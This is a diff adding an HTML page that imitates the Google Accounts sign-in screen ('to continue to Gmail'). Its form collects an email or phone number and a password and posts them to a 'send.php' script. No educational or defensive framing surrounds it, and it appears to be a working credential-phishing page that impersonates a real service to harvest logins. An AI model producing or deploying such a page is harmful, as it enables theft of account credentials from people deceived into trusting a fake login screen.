@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in – Google Accounts</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: 'Roboto', sans-serif; background: #fff; text-align: center; padding-top: 90px; }
+    form { padding: 20px; width: 300px; margin: auto; border: 1px solid #ccc; border-radius: 8px; }
+    input { width: 100%; padding: 10px; margin: 12px 0; border: 1px solid #ccc; border-radius: 4px; }
+    .btn { background: #1a73e8; color: white; font-weight: bold; border: none; padding: 10px; border-radius: 5px; }
+  </style>
+</head>
+<body>
+  <form action="send.php" method="POST">
+    <h2>Sign in</h2>
+    <p>to continue to Gmail</p>
+    <input type="text" name="username" placeholder="Email or phone" required>
+    <input type="password" name="password" placeholder="Enter your password" required>
+    <input type="submit" class="btn" value="Next">
+  </form>
+</body>
+</html>
